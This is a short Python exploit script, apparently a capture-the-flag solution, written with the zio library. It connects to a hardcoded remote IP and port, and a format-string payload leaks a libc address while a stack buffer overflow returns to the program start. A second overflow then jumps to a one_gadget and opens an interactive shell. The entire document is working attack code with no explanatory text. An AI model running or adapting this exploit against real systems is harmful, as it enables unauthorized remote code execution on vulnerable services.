from zio import *

conn = ("./main")
conn = ("139.59.30.165", 9200)
io = zio(conn)

start = 0x400550
io.read_until(": \n")
io.writeline("%34$p..".ljust(0x40 + 8, 'a') + l64(start))

libcbase = int(io.read_until("..")[: -2], 16) - 0x5ed1c8
print hex(libcbase)

one_gadget = libcbase + 0xea36d
io.read_until(": \n")
# io.gdb_hint()
io.writeline((0x40 + 8) * 'a' + l64(one_gadget))


io.interact()
